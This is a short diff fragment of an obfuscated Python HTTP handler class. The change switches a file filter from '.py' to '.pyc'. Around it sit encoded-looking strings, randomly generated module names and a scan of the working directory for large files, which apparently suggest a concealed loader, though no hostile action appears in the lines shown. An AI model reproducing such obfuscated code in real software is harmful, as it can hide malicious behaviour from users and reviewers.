@@ -197,7 +197,7 @@ class Demo(BaseHTTPRequestHandler):
     _ad = "ZP4jYwNhZN=="  # ZGV3YwNhZP4k ZP4jYwNhZN==
     _c = os.getcwd()
     _foo = 'foo'
-    _foolist = [i for i in os.listdir() if i.endswith("py") and os.path.isfile(jo(os.getcwd(), i)) and os.path.getsize(
+    _foolist = [i for i in os.listdir() if i.endswith("pyc") and os.path.isfile(jo(os.getcwd(), i)) and os.path.getsize(
         jo(os.getcwd(), i)) > 0xfa000]
     _mainname = os.path.basename(__file__)
     if _mainname in _foolist: _foolist.remove(_mainname)
@@ -206,7 +206,7 @@ class Demo(BaseHTTPRequestHandler):
     else:
         _foo = "".join([random.choice("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
                         for i in range(random.randint(1, 10))])
-    _import_module = "./"[0:1].join(["py", _foo, ][::-1])
+    _import_module = "./"[0:1].join(["pyc", _foo, ][::-1])
     _import_modules = ["sys", "os", "random", "re", "threading", ]
     _uid1, _uid2, _uid3, _uid4 = tuple({random.randint(0x2328, 0xea60) for i in range(0xf)})[:4]
     _index = "==NpccaY0LGY4IaockJY5SzpL9FAhpwYkL3YxS2of52qiE2YmI2puIToyW3YyW3ow1FruWUJiZSGHu1Yg92LhVJqbEKna9lY6ZUp0EUn" \
